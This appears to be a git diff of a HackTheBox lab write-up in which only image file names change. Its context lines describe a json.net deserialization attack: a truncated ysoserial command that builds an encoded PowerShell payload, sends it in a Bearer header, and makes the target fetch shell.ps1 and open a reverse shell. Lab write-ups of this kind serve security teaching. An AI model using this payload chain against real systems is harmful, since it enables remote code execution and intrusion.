@@ -50,7 +50,7 @@ ftp: Login failed
 
 Port 80 just shows us a login for HackTheBox:
 
-<figure><img src="../../../.gitbook/assets/image (99) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (99) (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 When the traffic is viewed in Burpsuite, we can see a lot of different JS files being loaded as well:
 
@@ -175,7 +175,7 @@ ysoserial.exe -g ObjectDataProvider -f json.net -c "powershell -EncodedCommand S
 
 Then, we can send the encoded payload as the value of the `Bearer` header.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (112) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (112) (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 This would still return 500, but we would get a GET request for `shell.ps1` on a HTTP server and a reverse shell on our listener port!
 
